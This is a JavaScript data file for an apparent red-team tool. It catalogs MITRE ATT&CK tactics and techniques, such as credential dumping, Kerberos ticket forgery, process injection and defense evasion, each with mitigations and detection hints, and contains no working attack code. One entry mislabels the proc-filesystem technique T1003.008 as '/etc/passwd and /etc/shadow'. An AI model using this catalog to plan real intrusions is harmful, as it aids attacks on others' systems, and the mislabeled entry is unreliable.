// Darknode Red Team Operations Engine
// Comprehensive offensive security automation for authorized penetration testing.
// Educational reference — use only on systems you own or are authorized to test.
"use strict";

// ═══════════════════════════════════════════════════════════════════════════════
// MITRE ATT&CK TECHNIQUE MATRIX
// ═══════════════════════════════════════════════════════════════════════════════

export const MITRE_TACTICS = [
  { id: "TA0043", name: "Reconnaissance", description: "Gathering information to plan future adversary operations" },
  { id: "TA0042", name: "Resource Development", description: "Establishing resources to support operations" },
  { id: "TA0001", name: "Initial Access", description: "Trying to get into your network" },
  { id: "TA0002", name: "Execution", description: "Trying to run malicious code" },
  { id: "TA0003", name: "Persistence", description: "Trying to maintain their foothold" },
  { id: "TA0004", name: "Privilege Escalation", description: "Trying to gain higher-level permissions" },
  { id: "TA0005", name: "Defense Evasion", description: "Trying to avoid being detected" },
  { id: "TA0006", name: "Credential Access", description: "Trying to steal account names and passwords" },
  { id: "TA0007", name: "Discovery", description: "Trying to figure out your environment" },
  { id: "TA0008", name: "Lateral Movement", description: "Trying to move through your environment" },
  { id: "TA0009", name: "Collection", description: "Trying to gather data of interest" },
  { id: "TA0011", name: "Command and Control", description: "Trying to communicate with compromised systems" },
  { id: "TA0010", name: "Exfiltration", description: "Trying to steal data" },
  { id: "TA0040", name: "Impact", description: "Trying to manipulate, interrupt, or destroy systems and data" },
];

export const MITRE_TECHNIQUES = [
  // Reconnaissance
  { id: "T1595", tactic: "TA0043", name: "Active Scanning", description: "Scanning infrastructure to gather information for targeting", subtechniques: [
    { id: "T1595.001", name: "Scanning IP Blocks", description: "Scan IP blocks to gather victim network information" },
    { id: "T1595.002", name: "Vulnerability Scanning", description: "Scan for vulnerabilities in victim systems" },
    { id: "T1595.003", name: "Wordlist Scanning", description: "Brute force directories, subdomains, and virtual hosts" },
  ], mitigations: ["Pre-compromise mitigations are limited — monitor for scanning activity"], detection: ["Network IDS signatures for scanning tools", "Web application firewall logs", "Unusual traffic patterns from single source"] },
  { id: "T1592", tactic: "TA0043", name: "Gather Victim Host Information", description: "Gather information about victim hosts for targeting", subtechniques: [
    { id: "T1592.001", name: "Hardware", description: "Gather victim hardware information" },
    { id: "T1592.002", name: "Software", description: "Gather victim software information" },
    { id: "T1592.003", name: "Firmware", description: "Gather victim firmware information" },
    { id: "T1592.004", name: "Client Configurations", description: "Gather client configuration information" },
  ], mitigations: ["Limit public exposure of technical details"], detection: ["Monitor for suspicious information-gathering activity"] },
  { id: "T1589", tactic: "TA0043", name: "Gather Victim Identity Information", description: "Gather victim identity information for targeting", subtechniques: [
    { id: "T1589.001", name: "Credentials", description: "Search for leaked credentials in breach databases" },
    { id: "T1589.002", name: "Email Addresses", description: "Harvest email addresses from public sources" },
    { id: "T1589.003", name: "Employee Names", description: "Gather employee names from LinkedIn, websites" },
  ], mitigations: ["Limit publicly accessible personnel information"], detection: ["Monitor for credential leak notifications"] },
  { id: "T1590", tactic: "TA0043", name: "Gather Victim Network Information", description: "Gather information about victim network infrastructure", subtechniques: [
    { id: "T1590.001", name: "Domain Properties", description: "WHOIS, DNS records, domain registration details" },
    { id: "T1590.002", name: "DNS", description: "Query DNS for subdomains, MX records, name servers" },
    { id: "T1590.004", name: "Network Topology", description: "Map the network topology via traceroute, BGP" },
    { id: "T1590.005", name: "IP Addresses", description: "Identify IP ranges assigned to the target" },
    { id: "T1590.006", name: "Network Security Appliances", description: "Identify firewalls, IDS/IPS, WAFs" },
  ], mitigations: ["Minimize public DNS information", "Use privacy WHOIS"], detection: ["DNS query logs for enumeration patterns"] },
  { id: "T1593", tactic: "TA0043", name: "Search Open Websites/Domains", description: "Search public websites for victim information", subtechniques: [
    { id: "T1593.001", name: "Social Media", description: "Harvest data from social media platforms" },
    { id: "T1593.002", name: "Search Engines", description: "Use search engine dorking to find exposed data" },
    { id: "T1593.003", name: "Code Repositories", description: "Search GitHub/GitLab for leaked secrets" },
  ], mitigations: ["Security awareness training", "Monitor code repositories for secrets"], detection: ["Monitor for unusual search engine referrals"] },
  { id: "T1594", tactic: "TA0043", name: "Search Victim-Owned Websites", description: "Search victim websites for useful information", mitigations: ["Remove sensitive information from public websites"], detection: ["Web server access logs for crawling patterns"] },
  { id: "T1591", tactic: "TA0043", name: "Gather Victim Org Information", description: "Gather information about the victim organization", subtechniques: [
    { id: "T1591.001", name: "Determine Physical Locations", description: "Identify physical office locations" },
    { id: "T1591.002", name: "Business Relationships", description: "Identify partners, vendors, supply chain" },
    { id: "T1591.003", name: "Identify Business Tempo", description: "Determine work hours, fiscal calendar" },
    { id: "T1591.004", name: "Identify Roles", description: "Identify key personnel and their roles" },
  ], mitigations: ["Limit public organizational details"], detection: ["Monitor for OSINT-style profiling"] },
  { id: "T1596", tactic: "TA0043", name: "Search Open Technical Databases", description: "Search Shodan, Censys, VirusTotal for target info", subtechniques: [
    { id: "T1596.001", name: "DNS/Passive DNS", description: "Query passive DNS databases for historical records" },
    { id: "T1596.002", name: "WHOIS", description: "Query WHOIS databases for registration info" },
    { id: "T1596.003", name: "Digital Certificates", description: "Search certificate transparency logs" },
    { id: "T1596.004", name: "CDNs", description: "Identify CDN usage and origin servers" },
    { id: "T1596.005", name: "Scan Databases", description: "Query Shodan, Censys for exposed services" },
  ], mitigations: ["Monitor certificate transparency logs"], detection: ["Alert on organization mentions in scan databases"] },

  // Resource Development
  { id: "T1583", tactic: "TA0042", name: "Acquire Infrastructure", description: "Buy, lease, or rent infrastructure for operations", subtechniques: [
    { id: "T1583.001", name: "Domains", description: "Register domains for phishing or C2" },
    { id: "T1583.003", name: "Virtual Private Server", description: "Rent VPS for hosting payloads and C2" },
    { id: "T1583.004", name: "Server", description: "Set up dedicated servers for operations" },
    { id: "T1583.006", name: "Web Services", description: "Use cloud services (GitHub, Pastebin) for hosting" },
  ], mitigations: ["Monitor for newly registered domains"], detection: ["Domain reputation scoring", "Certificate transparency monitoring"] },
  { id: "T1587", tactic: "TA0042", name: "Develop Capabilities", description: "Build custom tools, exploits, and payloads", subtechniques: [
    { id: "T1587.001", name: "Malware", description: "Develop custom malware for the engagement" },
    { id: "T1587.002", name: "Code Signing Certificates", description: "Create or obtain code signing certificates" },
    { id: "T1587.003", name: "Digital Certificates", description: "Create SSL/TLS certificates for C2" },
    { id: "T1587.004", name: "Exploits", description: "Develop or modify exploits for target vulnerabilities" },
  ], mitigations: ["Patch management", "Application whitelisting"], detection: ["Sandboxing suspicious executables", "Certificate monitoring"] },
  { id: "T1585", tactic: "TA0042", name: "Establish Accounts", description: "Create fake accounts for social engineering", subtechniques: [
    { id: "T1585.001", name: "Social Media Accounts", description: "Create fake social media profiles" },
    { id: "T1585.002", name: "Email Accounts", description: "Create disposable email accounts for phishing" },
    { id: "T1585.003", name: "Cloud Accounts", description: "Create cloud service accounts for infrastructure" },
  ], mitigations: ["Social media monitoring"], detection: ["Monitor for impersonation of employees"] },
  { id: "T1588", tactic: "TA0042", name: "Obtain Capabilities", description: "Purchase or download offensive tools", subtechniques: [
    { id: "T1588.001", name: "Malware", description: "Purchase or download existing malware families" },
    { id: "T1588.002", name: "Tool", description: "Obtain legitimate tools repurposed for offense" },
    { id: "T1588.005", name: "Exploits", description: "Obtain existing exploits from public or private sources" },
    { id: "T1588.006", name: "Vulnerabilities", description: "Obtain zero-day vulnerability information" },
  ], mitigations: ["Patch management", "Threat intelligence feeds"], detection: ["Monitor for known offensive tool signatures"] },

  // Initial Access
  { id: "T1566", tactic: "TA0001", name: "Phishing", description: "Send phishing messages to gain access to victim systems", subtechniques: [
    { id: "T1566.001", name: "Spearphishing Attachment", description: "Email with malicious attachment (macro doc, HTA, ISO)" },
    { id: "T1566.002", name: "Spearphishing Link", description: "Email with link to credential harvesting or exploit page" },
    { id: "T1566.003", name: "Spearphishing via Service", description: "Phishing via social media, messaging platforms" },
    { id: "T1566.004", name: "Spearphishing Voice", description: "Vishing — social engineering via phone calls" },
  ], mitigations: ["Email filtering", "User awareness training", "MFA", "Sandboxing attachments"], detection: ["Email gateway analysis", "URL reputation checking", "Attachment sandboxing", "User-reported phishing"] },
  { id: "T1190", tactic: "TA0001", name: "Exploit Public-Facing Application", description: "Exploit vulnerabilities in internet-facing applications", mitigations: ["Patch management", "WAF", "Application isolation", "Network segmentation"], detection: ["WAF alerts", "Application logs for exploitation patterns", "IDS/IPS signatures"] },
  { id: "T1133", tactic: "TA0001", name: "External Remote Services", description: "Use legitimate remote access services (VPN, RDP, SSH)", mitigations: ["MFA on all remote access", "Network segmentation", "Activity monitoring"], detection: ["Unusual login times/locations", "Brute-force detection", "VPN connection anomalies"] },
  { id: "T1200", tactic: "TA0001", name: "Hardware Additions", description: "Introduce rogue hardware (USB, network implants)", mitigations: ["Device authentication (802.1X)", "USB device policies", "Physical security"], detection: ["Network device inventory monitoring", "USB device logs", "NAC alerts"] },
  { id: "T1199", tactic: "TA0001", name: "Trusted Relationship", description: "Compromise a trusted third party to gain access", mitigations: ["Third-party risk management", "Network segmentation", "Zero trust architecture"], detection: ["Monitor third-party access patterns", "Anomalous authentication from partner networks"] },
  { id: "T1195", tactic: "TA0001", name: "Supply Chain Compromise", description: "Manipulate products or delivery mechanisms before receipt", subtechniques: [
    { id: "T1195.001", name: "Compromise Software Dependencies", description: "Inject malicious code into open-source packages" },
    { id: "T1195.002", name: "Compromise Software Supply Chain", description: "Compromise the build/update process of legitimate software" },
    { id: "T1195.003", name: "Compromise Hardware Supply Chain", description: "Implant hardware backdoors during manufacturing" },
  ], mitigations: ["Software signing verification", "SBOM management", "Vendor security assessments"], detection: ["File integrity monitoring", "Build artifact verification", "Network behavior anomalies after updates"] },
  { id: "T1078", tactic: "TA0001", name: "Valid Accounts", description: "Use legitimate credentials obtained through other means", subtechniques: [
    { id: "T1078.001", name: "Default Accounts", description: "Use default credentials that were never changed" },
    { id: "T1078.002", name: "Domain Accounts", description: "Use compromised domain user credentials" },
    { id: "T1078.003", name: "Local Accounts", description: "Use compromised local account credentials" },
    { id: "T1078.004", name: "Cloud Accounts", description: "Use compromised cloud service credentials" },
  ], mitigations: ["MFA everywhere", "Password policies", "Credential monitoring", "Privileged access management"], detection: ["Impossible travel alerts", "Anomalous authentication patterns", "Failed login monitoring"] },
  { id: "T1189", tactic: "TA0001", name: "Drive-by Compromise", description: "Compromise via visiting a weaponized website", mitigations: ["Browser isolation", "Content filtering", "Keep browsers updated"], detection: ["Web proxy logs", "Endpoint detection for exploit chains", "Network traffic analysis"] },

  // Execution
  { id: "T1059", tactic: "TA0002", name: "Command and Scripting Interpreter", description: "Abuse command and scripting interpreters to execute commands", subtechniques: [
    { id: "T1059.001", name: "PowerShell", description: "Execute malicious PowerShell commands or scripts" },
    { id: "T1059.003", name: "Windows Command Shell", description: "Execute commands via cmd.exe" },
    { id: "T1059.004", name: "Unix Shell", description: "Execute commands via bash, sh, zsh" },
    { id: "T1059.005", name: "Visual Basic", description: "Execute VBScript or VBA macros" },
    { id: "T1059.006", name: "Python", description: "Execute malicious Python scripts" },
    { id: "T1059.007", name: "JavaScript", description: "Execute JavaScript via wscript, cscript, or Node.js" },
    { id: "T1059.009", name: "Cloud API", description: "Use cloud provider CLIs (aws, az, gcloud)" },
  ], mitigations: ["Script block logging", "Constrained language mode", "Application whitelisting"], detection: ["PowerShell script block logging (Event ID 4104)", "Command-line auditing (Event ID 4688)", "Process creation monitoring"] },
  { id: "T1204", tactic: "TA0002", name: "User Execution", description: "Rely on the user to execute malicious content", subtechniques: [
    { id: "T1204.001", name: "Malicious Link", description: "User clicks a malicious link" },
    { id: "T1204.002", name: "Malicious File", description: "User opens a malicious file" },
    { id: "T1204.003", name: "Malicious Image", description: "User deploys a malicious container image" },
  ], mitigations: ["User awareness training", "Application whitelisting", "Sandboxing"], detection: ["Endpoint process monitoring", "File execution from unusual locations"] },
  { id: "T1203", tactic: "TA0002", name: "Exploitation for Client Execution", description: "Exploit software vulnerabilities in client applications", mitigations: ["Application patching", "Browser isolation", "Sandboxing"], detection: ["Crash dump analysis", "Exploit detection signatures", "Behavioral analysis"] },
  { id: "T1047", tactic: "TA0002", name: "Windows Management Instrumentation", description: "Execute commands via WMI for remote code execution", mitigations: ["Disable WMI where not needed", "Restrict WMI permissions", "Network segmentation"], detection: ["WMI event subscription monitoring", "Process creation from WMI provider hosts", "Event ID 5861 (WMI activity)"] },
  { id: "T1053", tactic: "TA0002", name: "Scheduled Task/Job", description: "Schedule tasks for execution at specified times", subtechniques: [
    { id: "T1053.002", name: "At", description: "Use at.exe for scheduling on Windows" },
    { id: "T1053.003", name: "Cron", description: "Use crontab for scheduling on Linux" },
    { id: "T1053.005", name: "Scheduled Task", description: "Use schtasks.exe or Task Scheduler" },
  ], mitigations: ["Restrict task creation permissions", "Monitor scheduled task creation"], detection: ["Event ID 4698 (task created)", "Cron file modification monitoring", "Process creation from task scheduler"] },
  { id: "T1569", tactic: "TA0002", name: "System Services", description: "Execute via system service mechanisms", subtechniques: [
    { id: "T1569.001", name: "Launchctl", description: "Execute via macOS launchctl" },
    { id: "T1569.002", name: "Service Execution", description: "Execute via Windows service control manager" },
  ], mitigations: ["Restrict service creation permissions", "Application whitelisting"], detection: ["Event ID 7045 (service installed)", "Event ID 4697 (service installed)"] },

  // Persistence
  { id: "T1547", tactic: "TA0003", name: "Boot or Logon Autostart Execution", description: "Configure system to run code at startup or login", subtechniques: [
    { id: "T1547.001", name: "Registry Run Keys / Startup Folder", description: "Add entries to HKCU/HKLM Run keys or Startup folder" },
    { id: "T1547.004", name: "Winlogon Helper DLL", description: "Modify Winlogon registry entries for persistence" },
    { id: "T1547.005", name: "Security Support Provider", description: "Register a malicious SSP DLL" },
    { id: "T1547.009", name: "Shortcut Modification", description: "Modify LNK files to execute malicious code" },
    { id: "T1547.012", name: "Print Processors", description: "Register malicious print processor DLLs" },
    { id: "T1547.014", name: "Active Setup", description: "Abuse Active Setup registry key for persistence" },
  ], mitigations: ["Restrict registry permissions", "Startup program monitoring", "Application whitelisting"], detection: ["Registry modification monitoring (Sysmon Event ID 13)", "Startup folder file creation", "Autorun analysis tools"] },
  { id: "T1543", tactic: "TA0003", name: "Create or Modify System Process", description: "Create or modify system services for persistence", subtechniques: [
    { id: "T1543.001", name: "Launch Agent", description: "Create macOS Launch Agent for persistence" },
    { id: "T1543.002", name: "Systemd Service", description: "Create Linux systemd service for persistence" },
    { id: "T1543.003", name: "Windows Service", description: "Create Windows service for persistence" },
    { id: "T1543.004", name: "Launch Daemon", description: "Create macOS Launch Daemon for persistence" },
  ], mitigations: ["Restrict service creation", "File integrity monitoring"], detection: ["New service creation events", "Systemd unit file changes", "LaunchAgent/Daemon plist creation"] },
  { id: "T1136", tactic: "TA0003", name: "Create Account", description: "Create new accounts for persistent access", subtechniques: [
    { id: "T1136.001", name: "Local Account", description: "Create a local user account" },
    { id: "T1136.002", name: "Domain Account", description: "Create a domain user account" },
    { id: "T1136.003", name: "Cloud Account", description: "Create a cloud IAM account" },
  ], mitigations: ["Privileged account management", "MFA for account creation"], detection: ["Event ID 4720 (user account created)", "Event ID 4722 (account enabled)", "Cloud IAM audit logs"] },
  { id: "T1546", tactic: "TA0003", name: "Event Triggered Execution", description: "Establish persistence via event-triggered mechanisms", subtechniques: [
    { id: "T1546.001", name: "Change Default File Association", description: "Modify file type associations to run malicious code" },
    { id: "T1546.002", name: "Screensaver", description: "Set malicious screensaver for persistence" },
    { id: "T1546.003", name: "WMI Event Subscription", description: "Create WMI event filters for persistence" },
    { id: "T1546.004", name: ".bash_profile and .bashrc", description: "Modify shell profile files for persistence" },
    { id: "T1546.008", name: "Accessibility Features", description: "Replace accessibility binaries (sethc.exe, utilman.exe)" },
    { id: "T1546.011", name: "Application Shimming", description: "Use application compatibility shims for persistence" },
    { id: "T1546.013", name: "PowerShell Profile", description: "Modify PowerShell profile scripts for persistence" },
    { id: "T1546.015", name: "COM Object Hijacking", description: "Hijack COM object registration for persistence" },
  ], mitigations: ["Restrict registry permissions", "File integrity monitoring", "Application whitelisting"], detection: ["Registry key monitoring", "WMI subscription monitoring", "Profile file change detection"] },
  { id: "T1505", tactic: "TA0003", name: "Server Software Component", description: "Install persistent backdoors in server software", subtechniques: [
    { id: "T1505.001", name: "SQL Stored Procedures", description: "Install malicious stored procedures in databases" },
    { id: "T1505.003", name: "Web Shell", description: "Deploy web shells on compromised web servers" },
    { id: "T1505.004", name: "IIS Components", description: "Install malicious IIS modules" },
  ], mitigations: ["File integrity monitoring", "Web server hardening", "Code review"], detection: ["File creation in web directories", "Unusual web server child processes", "HTTP traffic analysis"] },
  { id: "T1098", tactic: "TA0003", name: "Account Manipulation", description: "Modify accounts to maintain access", subtechniques: [
    { id: "T1098.001", name: "Additional Cloud Credentials", description: "Add new credentials to cloud accounts" },
    { id: "T1098.002", name: "Additional Email Delegate Permissions", description: "Add mailbox delegation permissions" },
    { id: "T1098.003", name: "Additional Cloud Roles", description: "Assign additional IAM roles" },
    { id: "T1098.004", name: "SSH Authorized Keys", description: "Add SSH keys to authorized_keys" },
    { id: "T1098.005", name: "Device Registration", description: "Register new devices to Azure AD" },
  ], mitigations: ["Privileged account management", "MFA", "Audit logging"], detection: ["Account modification events", "SSH key changes", "IAM policy changes"] },

  // Privilege Escalation
  { id: "T1068", tactic: "TA0004", name: "Exploitation for Privilege Escalation", description: "Exploit software vulnerabilities to gain elevated privileges", mitigations: ["Patch management", "Exploit protection (EMET/Defender Exploit Guard)", "Least privilege"], detection: ["Crash dump analysis", "Endpoint detection for exploit patterns", "Privilege escalation event monitoring"] },
  { id: "T1055", tactic: "TA0004", name: "Process Injection", description: "Inject code into running processes for privilege escalation", subtechniques: [
    { id: "T1055.001", name: "DLL Injection", description: "Inject a DLL into a running process" },
    { id: "T1055.002", name: "PE Injection", description: "Inject portable executable code into memory" },
    { id: "T1055.003", name: "Thread Execution Hijacking", description: "Hijack a thread in a remote process" },
    { id: "T1055.004", name: "Asynchronous Procedure Call", description: "Queue APC to a thread in another process" },
    { id: "T1055.008", name: "Ptrace System Calls", description: "Use ptrace to inject into Linux processes" },
    { id: "T1055.012", name: "Process Hollowing", description: "Create a suspended process and overwrite its memory" },
  ], mitigations: ["Endpoint detection", "Code signing enforcement", "Credential Guard"], detection: ["Sysmon Event ID 8 (CreateRemoteThread)", "Unusual cross-process access patterns", "Memory allocation anomalies"] },
  { id: "T1548", tactic: "TA0004", name: "Abuse Elevation Control Mechanism", description: "Bypass or abuse elevation control to gain higher privileges", subtechniques: [
    { id: "T1548.001", name: "Setuid and Setgid", description: "Exploit SUID/SGID binaries on Linux" },
    { id: "T1548.002", name: "Bypass User Account Control", description: "Bypass Windows UAC using known techniques" },
    { id: "T1548.003", name: "Sudo and Sudo Caching", description: "Exploit sudo misconfigurations" },
    { id: "T1548.004", name: "Elevated Execution with Prompt", description: "Prompt user for credentials to escalate" },
  ], mitigations: ["Remove unnecessary SUID binaries", "Configure UAC to always prompt", "Restrict sudo access"], detection: ["Monitor UAC bypass patterns", "SUID binary execution monitoring", "Sudo log analysis"] },
  { id: "T1134", tactic: "TA0004", name: "Access Token Manipulation", description: "Manipulate access tokens to assume different security context", subtechniques: [
    { id: "T1134.001", name: "Token Impersonation/Theft", description: "Steal or impersonate tokens of other users" },
    { id: "T1134.002", name: "Create Process with Token", description: "Create a new process with a stolen token" },
    { id: "T1134.003", name: "Make and Impersonate Token", description: "Create a token for a domain user" },
    { id: "T1134.005", name: "SID-History Injection", description: "Inject SIDs into SID-History for escalation" },
  ], mitigations: ["Privileged account management", "Credential Guard", "Least privilege"], detection: ["Token manipulation events", "Unusual process creation with elevated tokens", "SID-History changes"] },

  // Defense Evasion
  { id: "T1027", tactic: "TA0005", name: "Obfuscated Files or Information", description: "Encode, encrypt, or obfuscate content to avoid detection", subtechniques: [
    { id: "T1027.001", name: "Binary Padding", description: "Add junk data to binaries to change hash" },
    { id: "T1027.002", name: "Software Packing", description: "Use packers like UPX to compress/encrypt executables" },
    { id: "T1027.003", name: "Steganography", description: "Hide data within images or other media files" },
    { id: "T1027.004", name: "Compile After Delivery", description: "Deliver source code and compile on target" },
    { id: "T1027.005", name: "Indicator Removal from Tools", description: "Remove identifying strings from tools" },
    { id: "T1027.006", name: "HTML Smuggling", description: "Smuggle malicious payloads inside HTML files" },
    { id: "T1027.009", name: "Embedded Payloads", description: "Embed payloads in otherwise benign files" },
    { id: "T1027.010", name: "Command Obfuscation", description: "Obfuscate commands using encoding or variable substitution" },
    { id: "T1027.011", name: "Fileless Storage", description: "Store payloads in registry, WMI, or environment variables" },
    { id: "T1027.012", name: "LNK Icon Smuggling", description: "Hide executable content in LNK icon resources" },
  ], mitigations: ["Antimalware with heuristic detection", "Script block logging", "Content inspection"], detection: ["High-entropy file detection", "PowerShell script block logging", "Suspicious file attributes"] },
  { id: "T1070", tactic: "TA0005", name: "Indicator Removal", description: "Delete or modify artifacts to cover tracks", subtechniques: [
    { id: "T1070.001", name: "Clear Windows Event Logs", description: "Clear Security, System, Application event logs" },
    { id: "T1070.002", name: "Clear Linux or Mac System Logs", description: "Clear syslog, auth.log, bash_history" },
    { id: "T1070.003", name: "Clear Command History", description: "Clear shell command history" },
    { id: "T1070.004", name: "File Deletion", description: "Delete files to remove evidence" },
    { id: "T1070.006", name: "Timestomp", description: "Modify file timestamps to blend in" },
    { id: "T1070.009", name: "Clear Persistence", description: "Remove persistence mechanisms before detection" },
  ], mitigations: ["Remote log collection (SIEM)", "Protected event log forwarding", "File integrity monitoring"], detection: ["Event ID 1102 (audit log cleared)", "Event ID 104 (system log cleared)", "Timestamp anomaly detection"] },
  { id: "T1562", tactic: "TA0005", name: "Impair Defenses", description: "Disable or modify security tools and logging", subtechniques: [
    { id: "T1562.001", name: "Disable or Modify Tools", description: "Stop antivirus, EDR, or firewall services" },
    { id: "T1562.002", name: "Disable Windows Event Logging", description: "Disable audit policies or event log service" },
    { id: "T1562.003", name: "Impair Command History Logging", description: "Disable shell history recording" },
    { id: "T1562.004", name: "Disable or Modify System Firewall", description: "Modify firewall rules to allow malicious traffic" },
    { id: "T1562.006", name: "Indicator Blocking", description: "Block security tool reporting" },
    { id: "T1562.009", name: "Safe Mode Boot", description: "Boot into safe mode to bypass security tools" },
    { id: "T1562.010", name: "Downgrade Attack", description: "Force use of weaker protocols or algorithms" },
  ], mitigations: ["Tamper protection on security tools", "Protected process light (PPL)", "Centralized logging"], detection: ["Security tool health monitoring", "Service stop events", "Audit policy changes"] },
  { id: "T1036", tactic: "TA0005", name: "Masquerading", description: "Manipulate features to make artifacts appear legitimate", subtechniques: [
    { id: "T1036.001", name: "Invalid Code Signature", description: "Use invalid or forged code signatures" },
    { id: "T1036.003", name: "Rename System Utilities", description: "Rename malicious files to look like system files" },
    { id: "T1036.004", name: "Masquerade Task or Service", description: "Name services to appear legitimate" },
    { id: "T1036.005", name: "Match Legitimate Name or Location", description: "Place malware in trusted directories" },
    { id: "T1036.007", name: "Double File Extension", description: "Use double extensions like .pdf.exe" },
    { id: "T1036.008", name: "Masquerade File Type", description: "Change file magic bytes to avoid detection" },
  ], mitigations: ["Code signing validation", "Application whitelisting", "Restrict execution from user directories"], detection: ["Process name vs binary path mismatch", "Unsigned executables in trusted locations", "Double extension detection"] },
  { id: "T1218", tactic: "TA0005", name: "System Binary Proxy Execution", description: "Use legitimate system binaries to execute malicious code", subtechniques: [
    { id: "T1218.001", name: "Compiled HTML File", description: "Execute code via compiled HTML help files (.chm)" },
    { id: "T1218.003", name: "CMSTP", description: "Execute code via CMSTP.exe INF file" },
    { id: "T1218.004", name: "InstallUtil", description: "Execute code via .NET InstallUtil" },
    { id: "T1218.005", name: "Mshta", description: "Execute JavaScript/VBScript via mshta.exe" },
    { id: "T1218.007", name: "Msiexec", description: "Execute code via Windows Installer msiexec.exe" },
    { id: "T1218.009", name: "Regsvcs/Regasm", description: "Execute code via .NET COM registration" },
    { id: "T1218.010", name: "Regsvr32", description: "Execute code via regsvr32.exe scrobj.dll" },
    { id: "T1218.011", name: "Rundll32", description: "Execute DLLs via rundll32.exe" },
    { id: "T1218.012", name: "Verclsid", description: "Execute code via verclsid.exe COM object loading" },
    { id: "T1218.014", name: "MMC", description: "Execute code via MMC snap-in (msc files)" },
  ], mitigations: ["Application whitelisting", "Restrict unused LOLBins", "Disable script hosts"], detection: ["LOLBin execution monitoring", "Unusual parent-child process relationships", "Network connections from system binaries"] },

  // Credential Access
  { id: "T1003", tactic: "TA0006", name: "OS Credential Dumping", description: "Dump credentials from the operating system", subtechniques: [
    { id: "T1003.001", name: "LSASS Memory", description: "Dump LSASS process memory for credentials (Mimikatz)" },
    { id: "T1003.002", name: "Security Account Manager", description: "Extract hashes from the SAM database" },
    { id: "T1003.003", name: "NTDS", description: "Extract Active Directory database (ntds.dit)" },
    { id: "T1003.004", name: "LSA Secrets", description: "Extract LSA secrets from registry" },
    { id: "T1003.005", name: "Cached Domain Credentials", description: "Extract cached domain logon credentials" },
    { id: "T1003.006", name: "DCSync", description: "Simulate domain controller replication to extract hashes" },
    { id: "T1003.007", name: "/etc/passwd and /etc/shadow", description: "Extract Linux password hashes" },
    { id: "T1003.008", name: "/etc/passwd and /etc/shadow", description: "Extract credentials from proc filesystem" },
  ], mitigations: ["Credential Guard", "LSASS PPL", "Disable WDigest", "Limit domain admin usage"], detection: ["LSASS access monitoring (Sysmon Event ID 10)", "Suspicious memory access patterns", "DCSync replication alerts"] },
  { id: "T1558", tactic: "TA0006", name: "Steal or Forge Kerberos Tickets", description: "Obtain or create Kerberos tickets for unauthorized access", subtechniques: [
    { id: "T1558.001", name: "Golden Ticket", description: "Forge TGT using the KRBTGT account hash" },
    { id: "T1558.002", name: "Silver Ticket", description: "Forge service ticket using the service account hash" },
    { id: "T1558.003", name: "Kerberoasting", description: "Request service tickets and crack them offline" },
    { id: "T1558.004", name: "AS-REP Roasting", description: "Request AS-REP for accounts without pre-authentication" },
  ], mitigations: ["Strong service account passwords", "Managed service accounts", "Regular KRBTGT rotation", "Require pre-authentication"], detection: ["Event ID 4769 (Kerberos service ticket requested)", "Anomalous TGS requests", "Encryption downgrade attempts"] },
  { id: "T1110", tactic: "TA0006", name: "Brute Force", description: "Attempt to access accounts through systematic password guessing", subtechniques: [
    { id: "T1110.001", name: "Password Guessing", description: "Manually or automatically try common passwords" },
    { id: "T1110.002", name: "Password Cracking", description: "Crack password hashes offline" },
    { id: "T1110.003", name: "Password Spraying", description: "Try one password against many accounts" },
    { id: "T1110.004", name: "Credential Stuffing", description: "Use breached credentials across services" },
  ], mitigations: ["Account lockout policies", "MFA", "Password complexity requirements", "Rate limiting"], detection: ["Event ID 4625 (failed logon) patterns", "Multiple auth failures across accounts", "Unusual login velocity"] },
  { id: "T1557", tactic: "TA0006", name: "Adversary-in-the-Middle", description: "Position between systems to intercept or modify communications", subtechniques: [
    { id: "T1557.001", name: "LLMNR/NBT-NS Poisoning and SMB Relay", description: "Capture NTLM hashes via LLMNR/NBT-NS poisoning" },
    { id: "T1557.002", name: "ARP Cache Poisoning", description: "Redirect traffic via ARP spoofing" },
    { id: "T1557.003", name: "DHCP Spoofing", description: "Set up rogue DHCP server to redirect traffic" },
  ], mitigations: ["Disable LLMNR and NBT-NS", "Network segmentation", "SMB signing", "Static ARP entries"], detection: ["LLMNR/NBT-NS traffic analysis", "ARP anomaly detection", "Network traffic pattern analysis"] },
  { id: "T1555", tactic: "TA0006", name: "Credentials from Password Stores", description: "Search common password storage locations for credentials", subtechniques: [
    { id: "T1555.001", name: "Keychain", description: "Access macOS Keychain for stored credentials" },
    { id: "T1555.003", name: "Credentials from Web Browsers", description: "Extract saved passwords from browser stores" },
    { id: "T1555.004", name: "Windows Credential Manager", description: "Extract from Windows Credential Manager" },
    { id: "T1555.005", name: "Password Managers", description: "Extract from password manager local vaults" },
    { id: "T1555.006", name: "Cloud Secrets Management Stores", description: "Access AWS Secrets Manager, Azure Key Vault" },
  ], mitigations: ["Restrict access to credential stores", "Use hardware-backed credential storage", "Monitor credential access"], detection: ["Credential store access monitoring", "Browser credential file access", "Key Vault/Secrets Manager audit logs"] },
  { id: "T1056", tactic: "TA0006", name: "Input Capture", description: "Capture user input including credentials", subtechniques: [
    { id: "T1056.001", name: "Keylogging", description: "Capture keystrokes to record credentials" },
    { id: "T1056.002", name: "GUI Input Capture", description: "Create fake login prompts to capture credentials" },
    { id: "T1056.003", name: "Web Portal Capture", description: "Inject credential-capturing code into web pages" },
    { id: "T1056.004", name: "Credential API Hooking", description: "Hook authentication APIs to intercept credentials" },
  ], mitigations: ["Endpoint protection", "MFA", "Secure input methods"], detection: ["API hooking detection", "Unusual input device activity", "Keyboard hook monitoring"] },

  // Discovery
  { id: "T1087", tactic: "TA0007", name: "Account Discovery", description: "Enumerate accounts on a system or domain", subtechniques: [
    { id: "T1087.001", name: "Local Account", description: "Enumerate local user accounts (net user)" },
    { id: "T1087.002", name: "Domain Account", description: "Enumerate domain user accounts (net user /domain)" },
    { id: "T1087.003", name: "Email Account", description: "Enumerate email accounts (Exchange, O365)" },
    { id: "T1087.004", name: "Cloud Account", description: "Enumerate cloud IAM accounts" },
  ], mitigations: ["Restrict directory queries", "Limit LDAP access"], detection: ["LDAP query monitoring", "net.exe execution", "Cloud IAM enumeration activity"] },
  { id: "T1018", tactic: "TA0007", name: "Remote System Discovery", description: "Discover remote systems on the network", mitigations: ["Network segmentation", "Disable unnecessary protocols"], detection: ["ARP scanning detection", "Net view/nbtstat execution", "Unusual ICMP/TCP scan patterns"] },
  { id: "T1046", tactic: "TA0007", name: "Network Service Discovery", description: "Scan for running services on remote hosts", mitigations: ["Network segmentation", "Host-based firewalls"], detection: ["Port scan detection", "SYN scan patterns", "Service enumeration tool usage"] },
